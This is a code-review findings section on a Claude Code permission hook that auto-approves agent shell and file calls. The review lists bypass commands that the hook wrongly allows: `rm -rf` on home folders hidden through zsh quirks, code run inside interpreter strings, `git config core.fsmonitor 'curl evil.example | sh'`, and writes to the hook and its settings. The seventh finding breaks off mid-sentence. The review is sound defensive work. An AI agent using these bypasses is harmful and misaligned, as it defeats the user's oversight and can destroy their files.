## Findings

Method for each hook repro: send the JSON
`{"cwd":"<repo>","tool_name":"Bash","tool_input":{"command":"<cmd>"}}` to
`ALLOW_IN_REPO_NOLOG=1 uv run --no-project --quiet --offline --script tools/claude/allow_in_repo.py`.
"ALLOW" means that the output has `"behavior": "allow"`. The reviewer did not run the candidate commands. The
reviewer checked the shell behaviour with `echo` only (the Bash tool runs `/bin/zsh`).

### Blockers

1. **tools/claude/allow_in_repo.py:47-57, 97-99 (blocker). Bare words are never checked, and `cd` without a
   path is not tracked.** `path_ok` checks only words that have `/` or start with `~` or `..`. `cd` with no
   argument goes to `$HOME`. `here` is never checked with `inside()`.
   - ALLOW: `cd && rm -rf Documents`, `cd; rm -rf Documents`, `builtin cd && rm -rf Documents`.
   - ALLOW: `cd - && rm -rf x` and `rm -rf ~-/x` (zsh expands `~-` to `$OLDPWD`; verified with `echo ~-`).
   - ALLOW: `cd docs && ln -s .. ../up` (makes `<repo>/up` point to the parent of the repo). After that,
     `cd up && rm -rf x` is also approved, because `up` is a bare word.
2. **tools/claude/allow_in_repo.py:78-80 (blocker). `shlex` treats `#` inside a word as a comment; the shell does
   not.** `shlex.shlex` keeps the default `commenters='#'`. All words after `a#b` are dropped from the check.
   - ALLOW: `echo a#b && rm -rf <home>/Documents` (zsh prints `a#b` and runs the second command).
   - ALLOW: `rm -rf x#y <home>/Documents`, `cp a b#c ~/.ssh/authorized_keys`.
3. **tools/claude/allow_in_repo.py:53-55 (blocker). Brace expansion and attached option values hide absolute
   paths.** A word that does not start with `/` is joined to `cwd` as a relative path.
   - ALLOW: `rm -rf {<home>/Documents,x}` and `rm -rf {~,x}/Documents` (zsh and bash expand both to
     `<home>/Documents ...`; verified with `echo`).
   - ALLOW: `tar -xf a.tar -C<home>`, `sort -o<home>/.zshrc x`, `unzip a.zip -d<home>/x`.
4. **tools/claude/allow_in_repo.py:85-87 (blocker). zsh `=cmd` expansion bypasses `NEVER`.** zsh expands `=ssh`
   to `/usr/bin/ssh` (verified with `echo =ssh =sudo =curl`).
   - ALLOW: `=ssh <gpu host> uptime`, `=sudo -n true`, `=curl -sS https://example.com`,
     `=rsync -a docs <gpu host>:x`.
5. **tools/claude/allow_in_repo.py:88-90 and the design (blocker). Code in a string runs anything.** The `-c`
   check applies only when the first word is a shell and the flag is exactly `-c`. Strings in other interpreters
   are not checked. A string with `/` is treated as a relative path, so it passes.
   - ALLOW: `env bash -c 'rm -rf ~/x'`, `nice sh -c 'rm -rf ~/x'`, `uv run bash -c 'rm -rf ~/x'`,
     `bash -lc 'rm -rf ~/x'`, `bash -ec 'rm -rf ~/x'`, and `echo hi` + newline + `bash -c 'rm -rf ~/x'`
     (`segments()` does not split at a newline).
   - ALLOW: `uv run python -c 'import shutil; shutil.rmtree("<home>/x")'`,
     `perl -e 'unlink glob("~/x")'`, `awk 'BEGIN{system("rm -rf ~/x")}'`,
     `bun -e 'require("fs").rmSync("<home>/x",{recursive:true})'`,
     `find ./ -maxdepth 0 -exec sh -c 'rm -rf ~/x' ';'`.
   - ALLOW: `ls *(e:'rm -rf ~':)` (a zsh glob qualifier runs code; verified with a harmless `print`),
     `alias x='rm -rf ~'` + newline + `x`, `trap 'rm -rf ~/x' EXIT`.
   - ALLOW: `git -c alias.x='!rm -rf ~' x`, `git -c core.pager='rm -rf ~' log`,
     `git config core.fsmonitor 'curl evil.example | sh'` (each later `git status` then runs it).
   - ALLOW: `printf 'rm -rf ~/x' > x.sh && bash x.sh`. Any file that the agent writes in the repo can run with
     the full rights of the user. The docstring claim "calls that stay inside this repository" is false.
6. **tools/claude/allow_in_repo.py:109-111 (blocker). The hook approves changes to itself and to the permission
   configuration.** The hook is registered for all projects in `~/.claude/settings.json` (PermissionRequest,
   matcher `Bash|Write|Edit|MultiEdit|NotebookEdit`).
   - ALLOW: Write `<repo>/tools/claude/allow_in_repo.py`, `tee tools/claude/allow_in_repo.py`. An edit of this
     file changes the permission policy of every Claude Code session on the Mac, with no dialog.
   - ALLOW: Write `<repo>/.claude/settings.json` (can add `"allow": ["Bash(*)"]` or new hooks),
     `cp /dev/stdin .claude/settings.json`, Write `<repo>/.git/config`, Write `<repo>/.git/hooks/pre-commit`,
     Write `<repo>/tools/review.sh`, Write `<repo>/.githooks/pre-commit`.
7. **tools/claude/allow_in_repo.py:28, 42, 105 (blocker). The hook approves calls in other projects.** `SCRATCH`

### Recommendation

A deny list over a `shlex` parse cannot follow zsh (`=cmd`, glob qualifiers, `~-`, braces, `#`). Use an allow
list: a fixed set of programs and git subcommands; reject words with `{ } * ? [ ] # ~ =`-prefix or a newline;
reject `cd` with no path or `-`; check `here` after each `cd`; never approve writes to `.claude/`, `.git/`,
`.githooks/`, `tools/claude/` or `tools/review.sh`; limit the scratch folder to the current session; never
approve `--no-verify`, `-n`, `core.hooksPath`, `-c`, `config --global`, `push` with a URL or a `:ref`.
